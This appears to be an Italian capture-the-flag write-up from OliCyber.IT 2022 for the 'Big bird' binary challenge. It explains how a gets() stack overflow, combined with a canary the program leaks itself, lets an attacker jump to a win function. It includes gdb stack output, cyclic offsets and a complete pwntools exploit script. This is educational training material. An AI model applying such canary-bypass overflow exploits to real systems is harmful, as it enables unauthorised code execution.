# OliCyber.IT 2022 - Competizione territoriale

## [binary-3] Big bird (11 risoluzioni)

La challenge è un binario molto semplice, che stampa delle informazioni, chiede dell'input all'utente e ritorna subito. C'è una evidente funzione `win` nel binario che stampa la flag.

### Soluzione

Guardando il binario si vede molto in fretta che per prendere l'input dall'utente, il binario usa la funzione `gets`, che è una funzione non usabile in modo sicuro praticamente in nessun modo, perché non fa alcun tipo di bounds check. È molto facile quindi sovrascrivere l'indirizzo di ritorno dalla funzione main. L'unico problema è che il binario è compilato con il canary abilitato, per cui sfondando il buffer dove possiamo scrivere, andremo a sovrascrivere proprio il canary, cosa che causerà un abort del programma, impedendoci di chiamare la funzione win.

Ci viene in aiuto proprio quello che ha stampato il programma, che è esattamente il canary. Possiamo accorgercene in più modi:

- guardando il binario, si vede che la cosa che viene stampata è esattamente a `[rbp - 0x8]`, che è dove si trova il canary
- con un po' di guessing visto che il canary è un intero completamente casuale tranne per il byte meno significativo che è settato a 0. Dato che ci viene stampato, è abbastanza facile vedere che la cosa che viene stampata ha proprio queste caratteristiche.
- guessing dal nome della challenge

Dobbiamo a questo punto scoprire l'indirizzo della funzione `win`. Avendo il binario l'ASLR disabilitato, questo è un compito semplice, in quanto l'indirizzo è noto a tempo di compilazione. Possiamo usare vari tool per leggerlo, usando pwntools come sotto oppure `nm`:

```
nm bigbird | grep win
0000000000401715 T win
```

L'unica cosa che ci manca è l'offset a cui andare a scrivere il canary e l'indirizzo di ritorno della funzione. Questo può tranquillamente essere calcolato staticamente guardando il binario, ma lo faremo con `gdb` per mostrare un metodo più comodo. Mettiamo un breakpoint subito dopo aver ricevuto il nostro input, cioè `break *main + 79`. Eseguiamo il binario con `run`, inseriamo molto input, per esempio usando `cyclic` di `pwntools` e vediamo il risultato sullo stack:

```
0x007fffffffdda0│+0x0000: "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"	 ← $rax, $rsp
0x007fffffffdda8│+0x0008: "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"
0x007fffffffddb0│+0x0010: "eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqa[...]"
0x007fffffffddb8│+0x0018: "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"
0x007fffffffddc0│+0x0020: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0x007fffffffddc8│+0x0028: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0x007fffffffddd0│+0x0030: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"	 ← $rbp
0x007fffffffddd8│+0x0038: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
```

Dobbiamo sovrascrivere la linea esattamente sopra `rbp` con il canary, quella subito sotto con l'indirizzo di ritorno. Possiamo ricavare l'offset leggendo dagli indirizzi, visto che il buffer è allineato alla cima dello stack, oppure usando pwntools:

```
cyclic -l kaaa
# risultato: 0x28
cyclic -l oaaa
# risultato: 0x38
```

Ricordiamo per chiarezza che lo stack frame di una funzione è fatto nel seguente modo:

```
dati             <- rsp
dati
dati
dati
canary
old_rbp          <- rbp
return_address
dati
dati
dati
```

### Exploit

```python
#!/usr/bin/env python
from pwn import ELF, context, process, args, flat, log

exe = context.binary = ELF("bigbird")
remotehost = ("bigbird.challs.olicyber.it", 12006)

if __name__ == "__main__":
    io = remote(*remotehost) if args.REMOTE else process([exe.path])
    io.recvuntil(b"BIG BIRD: ")
    canary = int(io.recvline(False), 16)
    io.sendlineafter(b"good music", flat({0x28: canary, 0x38: exe.sym['win']}))
    io.recvlines(2)
    flag = io.recvline().decode()
    log.success(flag)
    io.close()
```
